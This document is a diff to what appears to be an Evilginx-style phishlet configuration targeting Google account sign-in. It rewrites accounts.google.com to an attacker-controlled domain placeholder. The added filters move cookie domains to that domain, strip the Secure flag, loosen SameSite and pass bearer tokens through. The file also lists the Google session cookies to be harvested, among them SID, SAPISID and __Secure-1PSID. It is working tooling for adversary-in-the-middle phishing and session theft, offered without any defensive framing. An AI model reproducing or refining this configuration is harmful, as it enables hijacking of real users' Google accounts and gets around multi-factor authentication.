@@ -5,6 +5,12 @@ proxy_hosts:
 sub_filters:
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: '{{.Endpoint3}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com', replace: 'https://{{.Endpoint3}}.{{.Domain}}', mimes: ['text/html', 'application/json']}
+  
+  # Cookie and Security Header Handling
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '.google.com', replace: '.{{.Domain}}', mimes: [], headers: ['Set-Cookie', 'Cookie']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'Secure;', replace: '', mimes: [], headers: ['Set-Cookie']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'SameSite=Lax', replace: 'SameSite=None', mimes: [], headers: ['Set-Cookie']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'Authorization: Bearer', replace: 'Authorization: Bearer', mimes: [], headers: ['Authorization']}
 auth_tokens:
   - domain: '.google.com'
     keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'LSID', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID', 'ACCOUNT_CHOOSER', 'OTZ']
